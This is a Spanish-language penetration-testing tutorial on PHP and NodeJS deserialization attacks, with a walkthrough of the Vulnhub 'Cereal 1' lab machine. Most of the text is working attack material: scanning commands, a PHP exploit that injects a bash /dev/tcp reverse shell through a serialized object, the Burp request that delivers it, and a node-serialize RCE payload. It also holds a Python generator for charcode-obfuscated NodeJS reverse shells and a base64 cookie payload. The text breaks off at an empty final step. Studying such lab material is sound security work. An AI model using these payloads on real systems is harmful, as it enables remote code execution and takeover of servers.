# Deserialitzation Attack

Los **ataques de deserialización** son un tipo de ataque que aprovecha las vulnerabilidades en los procesos de **serialización** y **deserialización** de objetos en aplicaciones que utilizan la programación orientada a objetos (**POO**).

La serialización es el proceso de convertir un objeto en una secuencia de **bytes** que puede ser almacenada o transmitida a través de una red. La deserialización es el proceso inverso, en el que una secuencia de bytes es convertida de nuevo a un objeto. Los ataques de deserialización ocurren cuando un atacante puede manipular los datos que se están deserializando, lo que puede llevar a la **ejecución de código malicioso** en el servidor.

Los ataques de deserialización pueden ocurrir en diferentes tipos de aplicaciones, incluyendo aplicaciones web, aplicaciones móviles y aplicaciones de escritorio. Estos ataques pueden ser explotados de varias maneras, como:

* Modificar el objeto serializado antes de que sea enviado a la aplicación, lo que puede causar errores en la deserialización y permitir que un atacante ejecute código malicioso.
* Enviar un objeto serializado malicioso que aproveche una vulnerabilidad en la aplicación para ejecutar código malicioso.
* Realizar un ataque de “**man-in-the-middle**” para interceptar y modificar el objeto serializado antes de que llegue a la aplicación.

Los ataques de deserialización pueden ser muy peligrosos, ya que pueden permitir que un atacante tome el control completo del servidor o la aplicación que está siendo atacada.

Para evitar estos ataques, es importante que las aplicaciones validen y autentiquen adecuadamente todos los datos que reciben antes de deserializarlos. También es importante utilizar bibliotecas de serialización y deserialización seguras y actualizar regularmente todas las bibliotecas y componentes de la aplicación para corregir posibles vulnerabilidades.

A continuación se os proporciona el enlace directo a la máquina de Vulnhub donde explotamos un ‘**PHP Deserialization Attack**‘:

* **Máquina Cereal 1**: [https://www.vulnhub.com/entry/cereal-1,703/](https://www.vulnhub.com/entry/cereal-1,703/)

### PHP Deserialitzation Attack

* Empezamos con **arp-scan** para encontrar **equipos** a través del protocolo ARP:

```bash
❯ arp-scan -I enp0s3 --localnet --ignoredups
192.168.1.48	08:00:27:54:94:d1	PCS Systemtechnik GmbH
```

* Comprovamos la **conectividad** con la màquina victima haciendo ping:

```bash
❯ ping -c 1 192.168.1.48
PING 192.168.1.48 (192.168.1.48) 56(84) bytes of data.
64 bytes from 192.168.1.48: icmp_seq=1 ttl=64 time=1.02 ms

--- 192.168.1.48 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 1.021/1.021/1.021/0.000 ms
```

* Escanear todos los puertos abiertos de la màquina victima:

```bash
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.48

PORT      STATE SERVICE        REASON
21/tcp    open  ftp            syn-ack ttl 64
22/tcp    open  ssh            syn-ack ttl 64
80/tcp    open  http           syn-ack ttl 64
139/tcp   open  netbios-ssn    syn-ack ttl 64
445/tcp   open  microsoft-ds   syn-ack ttl 64
3306/tcp  open  mysql          syn-ack ttl 64
11111/tcp open  vce            syn-ack ttl 64
22222/tcp open  easyengine     syn-ack ttl 64
22223/tcp open  unknown        syn-ack ttl 64
33333/tcp open  dgi-serv       syn-ack ttl 64
33334/tcp open  speedtrace     syn-ack ttl 64
44441/tcp open  unknown        syn-ack ttl 64
44444/tcp open  cognex-dataman syn-ack ttl 64
55551/tcp open  unknown        syn-ack ttl 64
55555/tcp open  unknown        syn-ack ttl 64
MAC Address: 08:00:27:54:94:D1 (Oracle VirtualBox virtual NIC)
```

* Escanear versiones de los servicios abiertos en la màquina victima:

```bash
❯ nmap -sCV -p21,22,80,139,445,3306,11111,22222,22223,33333,33334,44441,44444,55551,55555 192.168.1.48

PORT      STATE SERVICE    VERSION
21/tcp    open  ftp        vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.1.43
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 0        0               6 Apr 12  2021 pub
22/tcp    open  ssh        OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 00242bae41baac52d15d4fad00ce3967 (RSA)
|   256 1ae3c737522edcdd62610327551a866f (ECDSA)
|_  256 24fde78089c557fdf3e5c92f01e16b30 (ED25519)
80/tcp    open  http       Apache httpd 2.4.37 (())
|_http-title: Apache HTTP Server Test Page powered by: Rocky Linux
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.37 ()
139/tcp   open  tcpwrapped
445/tcp   open  tcpwrapped
3306/tcp  open  mysql?
| fingerprint-strings: 
|   Help, LDAPSearchReq, LPDString, NULL, NotesRPC, TerminalServer, X11Probe: 
|_    Host 'parrot.home' is not allowed to connect to this MariaDB server
11111/tcp open  tcpwrapped
22222/tcp open  tcpwrapped
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
22223/tcp open  tcpwrapped
33333/tcp open  tcpwrapped
33334/tcp open  tcpwrapped
44441/tcp open  http       Apache httpd 2.4.37 (())
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.37 ()
44444/tcp open  tcpwrapped
55551/tcp open  tcpwrapped
55555/tcp open  tcpwrapped
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.93%I=7%D=6/18%Time=648E766F%P=x86_64-pc-linux-gnu%r(NU
SF:LL,4A,"F\0\0\x01\xffj\x04Host\x20'parrot\.home'\x20is\x20not\x20allowed
SF:\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(Help,4A,"F\0\0
SF:\x01\xffj\x04Host\x20'parrot\.home'\x20is\x20not\x20allowed\x20to\x20co
SF:nnect\x20to\x20this\x20MariaDB\x20server")%r(X11Probe,4A,"F\0\0\x01\xff
SF:j\x04Host\x20'parrot\.home'\x20is\x20not\x20allowed\x20to\x20connect\x2
SF:0to\x20this\x20MariaDB\x20server")%r(LPDString,4A,"F\0\0\x01\xffj\x04Ho
SF:st\x20'parrot\.home'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20
SF:this\x20MariaDB\x20server")%r(LDAPSearchReq,4A,"F\0\0\x01\xffj\x04Host\
SF:x20'parrot\.home'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20thi
SF:s\x20MariaDB\x20server")%r(TerminalServer,4A,"F\0\0\x01\xffj\x04Host\x2
SF:0'parrot\.home'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\
SF:x20MariaDB\x20server")%r(NotesRPC,4A,"F\0\0\x01\xffj\x04Host\x20'parrot
SF:\.home'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20Maria
SF:DB\x20server");
MAC Address: 08:00:27:54:94:D1 (Oracle VirtualBox virtual NIC)
Service Info: OS: Unix

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
```

* Buscar directorios del servidor web de la màquina victima:

```bash
❯ gobuster dir -u http://192.168.1.48/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200
===============================================================
/admin                (Status: 301) [Size: 234] [--> http://192.168.1.48/admin/]
/blog                 (Status: 301) [Size: 233] [--> http://192.168.1.48/blog/] 
===============================================================
```

Si entramos al directorio /blog vemos que es un wordpress y que en el codigo fuente vemos que carga los recursos de `link rel='dns-prefetch' href='[//cereal.ctf](view-source:http://cereal.ctf/)' />` por lo tanto en el archivo /etc/hosts debemos resolver el dominio con la ip.

```bash
❯ cat /etc/hosts | tail -n 1
192.168.1.48	cereal.ctf
```

* Buscar **subdominios** con gobuster en el servidor web por el puerto 44441:

```bash
❯ gobuster vhost -u http://cereal.ctf:44441/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 200
===============================================================
Found: secure.cereal.ctf:44441 (Status: 200) [Size: 1538]
===============================================================
```

* Añadimos el **subdomino** en archivo /etc/hosts para que **resuelva** a la IP:

```bash
❯ cat /etc/hosts | tail -n 1
192.168.1.48	cereal.ctf secure.cereal.ctf
```

**➜** `http://secure.cereal.ctf:44441/`

Cuando entramos vemos que la pagina hay un ping test y lo que hace es enviar 3 ping a una ip que hayamos puesto, entonces vamos a buscar directorios existentes com gobuster:

```bash
❯ gobuster dir -u http://secure.cereal.ctf:44441/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -t 200
===============================================================
/php                  (Status: 200) [Size: 3699]
/style                (Status: 200) [Size: 3118]
/index                (Status: 200) [Size: 1539]
/back_en              (Status: 301) [Size: 247] [--> http://secure.cereal.ctf:44441/back_en/]
===============================================================
```

* Buscar en el directorio /back\_en archivos extension .bak:

```bash
❯ gobuster dir -u http://secure.cereal.ctf:44441/back_en/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -x php.bak
===============================================================
/index.php.bak        (Status: 200) [Size: 1814]
===============================================================
```

* Y en el codigo fuente vemos el script en php para deserializar y serialitzar que se ve que es un backup de la pagina que esta en **➜** `http://secure.cereal.ctf:44441/`:

```php
<?php
class pingTest {
	public $ipAddress = "127.0.0.1";
	public $isValid = False;
	public $output = "";
	function validate() {
		if (!$this->isValid) {
			if (filter_var($this->ipAddress, FILTER_VALIDATE_IP))
			{
				$this->isValid = True;
			}
		}
		$this->ping();
	}
	public function ping()
        {
		if ($this->isValid) {
			$this->output = shell_exec("ping -c 3 $this->ipAddress");	
		}
        }
}
if (isset($_POST['obj'])) {
	$pingTest = unserialize(urldecode($_POST['obj']));
} else {
	$pingTest = new pingTest;
}
$pingTest->validate();
echo "<html>
<head>
<script src=[\"http://secure.cereal.ctf:44441/php.js\"](view-source:http://secure.cereal.ctf:44441/%22http://secure.cereal.ctf:44441/php.js/%22 "Quote in an unquoted attribute value. Probable causes: Attributes running together or a URL query string in an unquoted attribute value.
Quote in an unquoted attribute value. Probable causes: Attributes running together or a URL query string in an unquoted attribute value.")></script>
<script>
function submit_form() {
		var object = serialize({ipAddress: document.forms[\"ipform\"].ip.value});
		object = object.substr(object.indexOf(\"{\"),object.length);
		object = \"O:8:\\\"pingTest\\\":1:\" + object;
		document.forms[\"ipform\"].obj.value = object;
		document.getElementById('ipform').submit();
}
</script>
<link rel='stylesheet' href='[http://secure.cereal.ctf:44441/style.css](view-source:http://secure.cereal.ctf:44441/style.css)' media='all' />
<title>Ping Test</title>
</head>
<body>
<div class=\"form-body\">
<div class=\"row\">
    <div class=\"form-holder\">
	<div class=\"form-content\">
	    <div class=\"form-items\">
		<h3>Ping Test</h3>
		
		<form method=\"POST\" action=[\"/\"](view-source:http://secure.cereal.ctf:44441/%22//%22 "Quote in an unquoted attribute value. Probable causes: Attributes running together or a URL query string in an unquoted attribute value.
Quote in an unquoted attribute value. Probable causes: Attributes running together or a URL query string in an unquoted attribute value.") id=\"ipform\" onsubmit=\"submit_form();\" class=\"requires-validation\" novalidate>

		    <div class=\"col-md-12\">
			<input name=\"obj\" type=\"hidden\" value=\"\">
		       <input class=\"form-control\" type=\"text\" name=\"ip\" placeholder=\"IP Address\" required>
		    </div>
		<br />
		    <div class=\"form-button mt-3\">
			<input type=\"submit\" value=\"Ping!\">
			<br /><br /><textarea>$pingTest->output</textarea>
		    </div>
		</form>
	    </div>
	</div>
    </div>
</div>
</div>
</body>
</html>";
?>
```

Y partir de la clase pingTest crearemos un objeto **serializado** donde podemos ejecutar el comando que queramos en **PHP**:

```php
<?php
	class pingTest {
		public $ipAddress = "; bash -c 'bash -i >& /dev/tcp/<tu-ip>/<puerto> 0>&1'";
		public $isValid = True;
		public $output = "";
	}

	echo urlencode(serialize(new pingTest));
?>
```

* Ejecutamos el archivo en php para crear el objeto:

```bash
❯ php exploit.php 2>/dev/null; echo
O%3A8%3A%22pingTest%22%3A3%3A%7Bs%3A9%3A%22ipAddress%22%3Bs%3A54%3A%22%3B+bash+-c+%27bash+-i+%3E%26+%2Fdev%2Ftcp%2F192.168.1.43%2F4444+0%3E%261%27%22%3Bs%3A7%3A%22isValid%22%3Bb%3A1%3Bs%3A6%3A%22output%22%3Bs%3A0%3A%22%22%3B%7D
```

* Nos podemos poner en escucha para recibir una reverse shell:

```bash
❯ nc -nlvp <puerto>
listening on [any] 4444 ...
```

Y enviamos una peticion con burpsuite donde el campo obj enviaremos el objeto que ejecutara el comando deseado:

```
POST / HTTP/1.1
Host: secure.cereal.ctf:44441
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://secure.cereal.ctf:44441/
Content-Type: application/x-www-form-urlencoded
Content-Length: 237
Origin: http://secure.cereal.ctf:44441
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1

obj=O%3A8%3A%22pingTest%22%3A3%3A%7Bs%3A9%3A%22ipAddress%22%3Bs%3A54%3A%22%3B+bash+-c+%27bash+-i+%3E%26+%2Fdev%2Ftcp%2F192.168.1.43%2F4444+0%3E%261%27%22%3Bs%3A7%3A%22isValid%22%3Bb%3A1%3Bs%3A6%3A%22output%22%3Bs%3A0%3A%22%22%3B%7D&ip=127.0.0.1
```

* Y recibimos la reverse shell y estariamos dentro de la maquina victima:

```bash
❯ nc -nlvp <puerto>
listening on [any] 4444 ...
connect to [192.168.1.43] from (UNKNOWN) [192.168.1.48] 43526
bash: cannot set terminal process group (820): Inappropriate ioctl for device
bash: no job control in this shell
bash-4.4$ whoami
apache
bash-4.4$ 
```

### NodeJS Deserialitzation Attack

* Montar servidor web para practicar la vulnerabilidad:

```node
var express = require('express');
var cookieParser = require('cookie-parser');
var escape = require('escape-html');
var serialize = require('node-serialize');
var app = express();
app.use(cookieParser())
 
app.get('/', function(req, res) {
 if (req.cookies.profile) {
   var str = new Buffer(req.cookies.profile, 'base64').toString();
   var obj = serialize.unserialize(str);
   if (obj.username) {
     res.send("Hello " + escape(obj.username));
   }
 } else {
     res.cookie('profile', "eyJ1c2VybmFtZSI6ImFqaW4iLCJjb3VudHJ5IjoiaW5kaWEiLCJjaXR5IjoiYmFuZ2Fsb3JlIn0=", {
       maxAge: 900000,
       httpOnly: true
     });
 }
 res.send("Hello World");
});
app.listen(3000);
```

* Tendremos que instalar unos modulos para poder iniciar el servidor:

```bash
❯ npm install express node-serialize cookie-parser
❯ node server.js
```

* Crear archivo js para serialitzar:

```node
var y = {
 rce : function(){
 require('child_process').exec('id', function(error, stdout, stderr) { console.log(stdout) });
 },
}
var serialize = require('node-serialize');
console.log("Serialized: \n" + serialize.serialize(y));
```

* Ejecucion:

```bash
❯ node serialitzeNJS.js
Serialized: 
{"rce":"_$$ND_FUNC$$_function(){\n require('child_process').exec('id', function(error, stdout, stderr) { console.log(stdout) });\n }"}
```

* Archivo js para deserialitzar:

```node
var serialize = require('node-serialize');
var payload = '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'id\', function(error, stdout, stderr) { console.log(stdout) });}()"}'
serialize.unserialize(payload);
```

* Uso:

```bash
❯ node deserialitzeNJS.js
uid=0(root) gid=0(root) grupos=0(root)
```

* Script en python para crear una reverse shell en NodeJS:

```python
#!/usr/bin/python
# Generator for encoded NodeJS reverse shells
# Based on the NodeJS reverse shell by Evilpacket
# https://github.com/evilpacket/node-shells/blob/master/node_revshell.js
# Onelineified and suchlike by infodox (and felicity, who sat on the keyboard)
# Insecurety Research (2013) - insecurety.net
import sys

if len(sys.argv) != 3:
    print "Usage: %s <LHOST> <LPORT>" % (sys.argv[0])
    sys.exit(0)

IP_ADDR = sys.argv[1]
PORT = sys.argv[2]


def charencode(string):
    """String.CharCode"""
    encoded = ''
    for char in string:
        encoded = encoded + "," + str(ord(char))
    return encoded[1:]

print "[+] LHOST = %s" % (IP_ADDR)
print "[+] LPORT = %s" % (PORT)
NODEJS_REV_SHELL = '''
var net = require('net');
var spawn = require('child_process').spawn;
HOST="%s";
PORT="%s";
TIMEOUT="5000";
if (typeof String.prototype.contains === 'undefined') { String.prototype.contains = function(it) { return this.indexOf(it) != -1; }; }
function c(HOST,PORT) {
    var client = new net.Socket();
    client.connect(PORT, HOST, function() {
        var sh = spawn('/bin/sh',[]);
        client.write("Connected!\\n");
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
        sh.on('exit',function(code,signal){
          client.end("Disconnected!\\n");
        });
    });
    client.on('error', function(e) {
        setTimeout(c(HOST,PORT), TIMEOUT);
    });
}
c(HOST,PORT);
''' % (IP_ADDR, PORT)
print "[+] Encoding"
PAYLOAD = charencode(NODEJS_REV_SHELL)
print "eval(String.fromCharCode(%s))" % (PAYLOAD)
```

* Uso:

```bash
❯ python2 rs.py
Usage: rs.py <LHOST> <LPORT>
❯ python2 rs.py 192.168.1.43 4444
[+] LHOST = 192.168.1.43
[+] LPORT = 4444
[+] Encoding
eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,57,50,46,49,54,56,46,49,46,52,51,34,59,10,80,79,82,84,61,34,52,52,52,52,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))
```

* Meter-lo en la funcion serialitzada:

```node
{"rce":"_$$ND_FUNC$$_function(){eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,57,50,46,49,54,56,46,49,46,52,51,34,59,10,80,79,82,84,61,34,52,52,52,52,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))}()"}
```

* Convertir-lo a base 64:

```bash
❯ cat data | base64 -w 0; echo
eyJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24oKXtldmFsKFN0cmluZy5mcm9tQ2hhckNvZGUoMTAsMTE4LDk3LDExNCwzMiwxMTAsMTAxLDExNiwzMiw2MSwzMiwxMTQsMTAxLDExMywxMTcsMTA1LDExNCwxMDEsNDAsMzksMTEwLDEwMSwxMTYsMzksNDEsNTksMTAsMTE4LDk3LDExNCwzMiwxMTUsMTEyLDk3LDExOSwxMTAsMzIsNjEsMzIsMTE0LDEwMSwxMTMsMTE3LDEwNSwxMTQsMTAxLDQwLDM5LDk5LDEwNCwxMDUsMTA4LDEwMCw5NSwxMTIsMTE0LDExMSw5OSwxMDEsMTE1LDExNSwzOSw0MSw0NiwxMTUsMTEyLDk3LDExOSwxMTAsNTksMTAsNzIsNzksODMsODQsNjEsMzQsNDksNTcsNTAsNDYsNDksNTQsNTYsNDYsNDksNDYsNTIsNTEsMzQsNTksMTAsODAsNzksODIsODQsNjEsMzQsNTIsNTIsNTIsNTIsMzQsNTksMTAsODQsNzMsNzcsNjksNzksODUsODQsNjEsMzQsNTMsNDgsNDgsNDgsMzQsNTksMTAsMTA1LDEwMiwzMiw0MCwxMTYsMTIxLDExMiwxMDEsMTExLDEwMiwzMiw4MywxMTYsMTE0LDEwNSwxMTAsMTAzLDQ2LDExMiwxMTQsMTExLDExNiwxMTEsMTE2LDEyMSwxMTIsMTAxLDQ2LDk5LDExMSwxMTAsMTE2LDk3LDEwNSwxMTAsMTE1LDMyLDYxLDYxLDYxLDMyLDM5LDExNywxMTAsMTAwLDEwMSwxMDIsMTA1LDExMCwxMDEsMTAwLDM5LDQxLDMyLDEyMywzMiw4MywxMTYsMTE0LDEwNSwxMTAsMTAzLDQ2LDExMiwxMTQsMTExLDExNiwxMTEsMTE2LDEyMSwxMTIsMTAxLDQ2LDk5LDExMSwxMTAsMTE2LDk3LDEwNSwxMTAsMTE1LDMyLDYxLDMyLDEwMiwxMTcsMTEwLDk5LDExNiwxMDUsMTExLDExMCw0MCwxMDUsMTE2LDQxLDMyLDEyMywzMiwxMTQsMTAxLDExNiwxMTcsMTE0LDExMCwzMiwxMTYsMTA0LDEwNSwxMTUsNDYsMTA1LDExMCwxMDAsMTAxLDEyMCw3OSwxMDIsNDAsMTA1LDExNiw0MSwzMiwzMyw2MSwzMiw0NSw0OSw1OSwzMiwxMjUsNTksMzIsMTI1LDEwLDEwMiwxMTcsMTEwLDk5LDExNiwxMDUsMTExLDExMCwzMiw5OSw0MCw3Miw3OSw4Myw4NCw0NCw4MCw3OSw4Miw4NCw0MSwzMiwxMjMsMTAsMzIsMzIsMzIsMzIsMTE4LDk3LDExNCwzMiw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDMyLDYxLDMyLDExMCwxMDEsMTE5LDMyLDExMCwxMDEsMTE2LDQ2LDgzLDExMSw5OSwxMDcsMTAxLDExNiw0MCw0MSw1OSwxMCwzMiwzMiwzMiwzMiw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQ2LDk5LDExMSwxMTAsMTEwLDEwMSw5OSwxMTYsNDAsODAsNzksODIsODQsNDQsMzIsNzIsNzksODMsODQsNDQsMzIsMTAyLDExNywxMTAsOTksMTE2LDEwNSwxMTEsMTEwLDQwLDQxLDMyLDEyMywxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwxMTgsOTcsMTE0LDMyLDExNSwxMDQsMzIsNjEsMzIsMTE1LDExMiw5NywxMTksMTEwLDQwLDM5LDQ3LDk4LDEwNSwxMTAsNDcsMTE1LDEwNCwzOSw0NCw5MSw5Myw0MSw1OSwxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQ2LDExOSwxMTQsMTA1LDExNiwxMDEsNDAsMzQsNjcsMTExLDExMCwxMTAsMTAxLDk5LDExNiwxMDEsMTAwLDMzLDkyLDExMCwzNCw0MSw1OSwxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQ2LDExMiwxMDUsMTEyLDEwMSw0MCwxMTUsMTA0LDQ2LDExNSwxMTYsMTAwLDEwNSwxMTAsNDEsNTksMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMTE1LDEwNCw0NiwxMTUsMTE2LDEwMCwxMTEsMTE3LDExNiw0NiwxMTIsMTA1LDExMiwxMDEsNDAsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0MSw1OSwxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwxMTUsMTA0LDQ2LDExNSwxMTYsMTAwLDEwMSwxMTQsMTE0LDQ2LDExMiwxMDUsMTEyLDEwMSw0MCw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQxLDU5LDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDExNSwxMDQsNDYsMTExLDExMCw0MCwzOSwxMDEsMTIwLDEwNSwxMTYsMzksNDQsMTAyLDExNywxMTAsOTksMTE2LDEwNSwxMTEsMTEwLDQwLDk5LDExMSwxMDAsMTAxLDQ0LDExNSwxMDUsMTAzLDExMCw5NywxMDgsNDEsMTIzLDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsNDYsMTAxLDExMCwxMDAsNDAsMzQsNjgsMTA1LDExNSw5OSwxMTEsMTEwLDExMCwxMDEsOTksMTE2LDEwMSwxMDAsMzMsOTIsMTEwLDM0LDQxLDU5LDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDEyNSw0MSw1OSwxMCwzMiwzMiwzMiwzMiwxMjUsNDEsNTksMTAsMzIsMzIsMzIsMzIsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0NiwxMTEsMTEwLDQwLDM5LDEwMSwxMTQsMTE0LDExMSwxMTQsMzksNDQsMzIsMTAyLDExNywxMTAsOTksMTE2LDEwNSwxMTEsMTEwLDQwLDEwMSw0MSwzMiwxMjMsMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMTE1LDEwMSwxMTYsODQsMTA1LDEwOSwxMDEsMTExLDExNywxMTYsNDAsOTksNDAsNzIsNzksODMsODQsNDQsODAsNzksODIsODQsNDEsNDQsMzIsODQsNzMsNzcsNjksNzksODUsODQsNDEsNTksMTAsMzIsMzIsMzIsMzIsMTI1LDQxLDU5LDEwLDEyNSwxMCw5OSw0MCw3Miw3OSw4Myw4NCw0NCw4MCw3OSw4Miw4NCw0MSw1OSwxMCkpfSgpIn0K
```

* Ponerse en escucha para recibir la reverse shell:

```bash
